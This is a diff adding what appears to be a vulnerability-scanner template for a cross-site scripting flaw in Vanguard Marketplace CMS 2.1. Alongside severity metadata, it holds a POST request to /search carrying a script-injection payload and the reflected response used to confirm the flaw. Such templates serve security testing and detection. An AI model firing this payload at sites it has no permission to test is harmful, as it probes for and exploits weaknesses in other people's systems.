@@ -1,0 +1,29 @@
+id: vanguard-post-xss
+info:
+  name: Vanguard Marketplace CMS 2.1 - Cross-Site Scripting
+  author: ImNightmaree
+  description: Vanguard Marketplace CMS 2.1 contains a cross-site scripting vulnerability
+    in the message and product title tags and in the product search box.
+  severity: high
+  reference:
+  - https://packetstormsecurity.com/files/157099/Vanguard-2.1-Cross-Site-Scripting.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+  tags: vanguard,xss,packetstorm
+traps:
+- request:
+    method: POST
+    path: /search
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: </script><script>alert(document.domain)</script>
